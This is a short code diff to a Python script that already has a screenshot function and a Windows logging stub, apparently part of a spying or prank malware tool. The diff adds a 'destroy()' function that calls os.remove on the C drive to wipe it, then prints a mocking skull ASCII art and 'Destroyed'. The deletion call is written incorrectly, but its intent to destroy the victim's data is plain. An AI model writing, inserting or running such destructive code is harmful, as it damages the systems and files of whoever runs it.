@@ -40,4 +40,26 @@ def takeshot():
 
 def log():
     #this is for windows
-    
+    pass
+
+def destroy():
+    import os  
+    location = "C://" 
+    os.remove(location)
+    print("""
+               ,-------------.
+      /               \
+     /   __       __   \
+    |  /,--.     ,--.\  |
+    |   \  |  __ |  /   |
+    |    `-' /  \`-/    |
+     \__    |_/\_|   __/
+       /_           _\
+    | | |,-.,-.,-.| |
+   `hah `-'| || || |`-'
+       ,-.`-'`-'`-',-.
+       \_|_,-.,-.,-|_/
+       | |_|_||_||_|
+        `--.____.--'
+    """)  
+    print("Destroyed")
